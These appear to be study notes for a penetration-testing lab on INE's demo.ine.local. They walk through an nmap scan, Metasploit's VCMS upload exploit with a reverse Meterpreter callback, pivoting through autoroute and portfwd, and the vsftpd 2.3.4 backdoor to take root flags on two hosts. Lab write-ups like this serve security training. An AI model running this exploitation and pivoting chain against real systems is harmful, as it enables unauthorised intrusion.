# Black-box Penetration Test 1 Notes

- Check if machine is reachable.

```ping demo.ine.local```

- Run scan on the machine using nmap.

```nmap -sV -A -O demo.ine.local```

- Identify the vulnerable service and its version and find its exploit. In this case **VCMS 1.0** is the vulnerable application running on port 80.

- Fire up Metasploit-Framework and search for exploit.

```
msfconsole -q
search vcms
use exploit/linux/http/vcms_upload
show options

# Set details in the vcms_upload exploit

set RHOSTs demo.ine.local
set TARGETURI /
set LHOST 192.62.135.2
check
exploit
meterpreter > getuid
meterpreter > ls /root

# First flag is located in root directory. Hence we have retreived our first flag.
meterpreter > cat /root/flag.txt
----------------------------------------------------------------------------------
# Run shell command in the same meterpreter session to get shell.
meterpreter > shell

# Then run ifconfig command to get all the interfaces on the machine.
root@ine:~# ifconfig

# Choose the interface and try to ping the IP to check if it is reachable.
root@ine:~# ping 192.69.228.2

# Machine is not reachable. So we need to perforn pivoting to reach machine.
# Use "autoroute" command to add route to unreachable IP range.
meterpreter > run autoroute -s 192.69.228.0 -n 255.255.255.0
meterpreter > background
meterpreter > route print
meterpreter > route add 192.69.228.0 255.255.255.0 1  - (1 is session id)
meterpreter > background

# We will run auxiliary TCP port scanning module to discover any available hosts (From IP .3 to .10). And, if any of ports 80, 8080, 445, 21 and 22 are open on those hosts.

use auxiliary/scanner/portscan/tcp
set PORTS 80, 8080, 445, 21, 22
set RHOSTS 192.69.228.3-10
exploit

# We have discovered one host i.e. 192.69.228.3. Ports 21 (FTP) and 22 (SSH) are open on this host.
# In the meterpreter session there is an utility "portfwd" which allows forwarding remote machine port to the local machine port. We want to target port 21 of that machine so we will forward remote port 21 to the local port 1234.

session -i <session ID>
portfwd -h
portfwd add -l 1234 -p 21 -r 192.69.228.3
background
nmap -sS -sV -p 1234 localhost

# We can observe from the results that host is running vsftpd (FTP) service.
search vsftpd

# Exploit the target host using vsftpd backdoor exploit module.
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 192.69.228.3
exploit
id
ls /root

# We have retreived the second flag also. We have exploited both the machines.
cat /root/flag.txt
```
